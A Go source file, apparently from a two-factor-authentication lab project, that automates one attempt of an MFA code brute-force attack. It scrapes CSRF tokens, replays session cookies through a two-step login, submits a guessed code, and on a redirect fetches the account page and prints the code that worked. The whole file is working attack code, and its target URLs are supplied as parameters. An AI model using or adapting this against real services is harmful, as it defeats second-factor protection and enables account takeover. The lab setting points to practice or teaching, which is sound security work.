package brute

import (
	httprequests "2falab/httpRequests"
	"2falab/parser"
	"fmt"
	"io"

	"golang.org/x/net/html"
)

func BruteForcer(urlLogIn string, urlLogIn2 string, myAccount string, mfa string) (bool, error) {

	var (
		csrf   string
		cookie string
	)

	//########################### GET /login ###########################
	response, err := httprequests.RequestGet(urlLogIn)
	if err != nil {
		return false, err
	}
	//fmt.Println("HTTP GET /login: ", response.Status)

	node, err := html.Parse(response.Body)
	if err != nil {
		return false, err
	}

	parser.FetchCSRF(node, &csrf)

	//########################### POST /login ###########################
	response, err = httprequests.RequestPost1(urlLogIn, csrf, response.Cookies()[0].Value)
	if err != nil {
		return false, err
	}

	//fmt.Println("HTTP POST /login: ", response.Status)

	//########################### GET /login2 ###########################
	csrf = ""
	cookie = response.Cookies()[0].Value

	response, err = httprequests.RequestGet2(urlLogIn2, cookie)
	if err != nil {
		return false, err
	}

	node, err = html.Parse(response.Body)
	if err != nil {
		return false, err
	}

	parser.FetchCSRF(node, &csrf)

	//fmt.Println("HTTP GET /login2:", response.Status)

	//########################### POST /login2 ###########################
	response, err = httprequests.RequestPost2(urlLogIn2, csrf, cookie, mfa)
	if err != nil {
		return false, err
	}

	fmt.Println("HTTP POST /login2:", response.Status)

	if response.StatusCode == 302 {
		cookie = response.Cookies()[0].Value

		response, err = httprequests.RequestGet2(myAccount, cookie)
		if err != nil {
			return false, err
		}

		body, err := io.ReadAll(response.Body)
		if err != nil {
			fmt.Println(err)
		}

		fmt.Println("mfa Code is: ", mfa)
		fmt.Println(string(body), "HTTP /my-account: ", response.StatusCode)

		return true, nil
	}
	return false, nil
}
